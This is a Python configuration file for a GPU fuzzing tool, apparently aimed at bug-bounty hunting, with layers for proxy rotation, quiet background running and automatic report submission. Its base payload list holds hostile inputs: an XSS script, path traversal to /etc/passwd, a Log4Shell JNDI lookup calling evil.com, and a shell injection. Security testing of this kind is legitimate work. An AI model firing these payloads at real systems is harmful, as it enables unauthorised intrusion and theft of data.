# -*- coding: utf-8 -*-
# PROPRIETARY SOFTWARE - RED POST FARMS, LLC
# Copyright (c) 2025-2026 Red Post Farms, LLC
# All Rights Reserved
# OMEGA V5 SWARM CONFIG - Configuration Management

"""
Configuration for Omega V5 Swarm
All settings in one place
"""

import sys
import io
import json
from pathlib import Path
from typing import Dict, Any

# Set UTF-8 encoding
if sys.platform == 'win32':
    try:
        if hasattr(sys.stdout, 'buffer') and not sys.stdout.buffer.closed:
            if not hasattr(sys.stdout, 'encoding') or sys.stdout.encoding != 'utf-8':
                sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
        if hasattr(sys.stderr, 'buffer') and not sys.stderr.buffer.closed:
            if not hasattr(sys.stderr, 'encoding') or sys.stderr.encoding != 'utf-8':
                sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')
    except (AttributeError, ValueError, OSError):
        pass

GATE = Path(r'D:\RPF_BRAIN\The Gatekeeper')
if not GATE.exists():
    GATE = Path.cwd() / 'The Gatekeeper'
if not GATE.exists() and Path.cwd().name == 'The Gatekeeper':
    GATE = Path.cwd()

SWARM_DIR = GATE / 'omega_swarm'
SWARM_DIR.mkdir(parents=True, exist_ok=True)

CONFIG_FILE = SWARM_DIR / 'swarm_config.json'


# Default configuration
DEFAULT_CONFIG = {
    # Layer 1: GPU Headroom
    'gpu_memory_fraction': 0.9,  # Use 90% of VRAM
    'gpu_enabled': True,
    'use_sli': False,  # Set to True if using SLI/PCIe split
    
    # Layer 2: CUDA Fuzzer
    'payloads_per_second': 80000,  # 80k payloads/sec target
    'mutation_rate': 0.1,  # 10% mutation rate
    'use_gpu_mutation': True,
    
    # Layer 3: Proxy Rotation
    'proxy_rotation': True,
    'proxy_timeout': 5,  # seconds
    'max_retries': 3,
    
    # Layer 4: False Positive Killer
    'use_z3_filter': True,
    'z3_timeout': 1,  # seconds per check
    
    # Layer 5: Auto-Report
    'auto_submit': False,  # Set to True to auto-submit (careful!)
    'report_format': 'hackerone',  # 'hackerone', 'bugcrowd', 'custom'
    'min_severity': 'medium',  # Only report medium+ severity
    
    # Layer 6: Cannibal Feedback
    'learn_from_rejections': True,
    'rejection_threshold': 3,  # Learn after 3 rejections of same type
    
    # Layer 7: Quiet Mode
    'quiet_mode': True,
    'log_level': 'WARNING',
    'background_mode': True,
    
    # Layer 8: Killswitch
    'killswitch_file': 'kill.omega',
    'check_killswitch_interval': 1,  # seconds
    
    # Targets
    'targets': [
        # Add your targets here
        # 'https://example.com',
    ],
    
    # Base payloads
    'base_payloads': [
        'test',
        '<script>alert(1)</script>',
        '../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
        '; cat /etc/passwd',
    ],
    
    # HackerOne/Bugcrowd API (if auto-submit enabled)
    'hackerone_api_key': '',  # Add your API key
    'bugcrowd_api_key': '',  # Add your API key
}


def load_config() -> Dict[str, Any]:
    """Load configuration from file."""
    if CONFIG_FILE.exists():
        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                config = json.load(f)
                # Merge with defaults
                merged = DEFAULT_CONFIG.copy()
                merged.update(config)
                return merged
        except Exception:
            pass
    
    # Return defaults and save
    save_config(DEFAULT_CONFIG)
    return DEFAULT_CONFIG


def save_config(config: Dict[str, Any]):
    """Save configuration to file."""
    try:
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=2)
    except Exception:
        pass


def show_config():
    """Show current configuration."""
    config = load_config()
    
    print("=" * 80)
    print("  OMEGA V5 SWARM CONFIGURATION")
    print("=" * 80)
    print()
    
    print("Layer 1 - GPU Headroom:")
    print(f"  GPU Enabled: {config['gpu_enabled']}")
    print(f"  Memory Fraction: {config['gpu_memory_fraction']}")
    print(f"  SLI/PCIe Split: {config['use_sli']}")
    print()
    
    print("Layer 2 - CUDA Fuzzer:")
    print(f"  Payloads/Second: {config['payloads_per_second']:,}")
    print(f"  GPU Mutation: {config['use_gpu_mutation']}")
    print()
    
    print("Layer 3 - Proxy Rotation:")
    print(f"  Enabled: {config['proxy_rotation']}")
    print(f"  Timeout: {config['proxy_timeout']}s")
    print()
    
    print("Layer 4 - False Positive Killer:")
    print(f"  Z3 Filter: {config['use_z3_filter']}")
    print()
    
    print("Layer 5 - Auto-Report:")
    print(f"  Auto Submit: {config['auto_submit']}")
    print(f"  Format: {config['report_format']}")
    print(f"  Min Severity: {config['min_severity']}")
    print()
    
    print("Layer 6 - Cannibal Feedback:")
    print(f"  Learn from Rejections: {config['learn_from_rejections']}")
    print()
    
    print("Layer 7 - Quiet Mode:")
    print(f"  Enabled: {config['quiet_mode']}")
    print(f"  Background: {config['background_mode']}")
    print()
    
    print("Layer 8 - Killswitch:")
    print(f"  File: {config['killswitch_file']}")
    print()
    
    print(f"Targets: {len(config.get('targets', []))}")
    print(f"Base Payloads: {len(config.get('base_payloads', []))}")
    print()
    
    print("=" * 80)


if __name__ == '__main__':
    show_config()
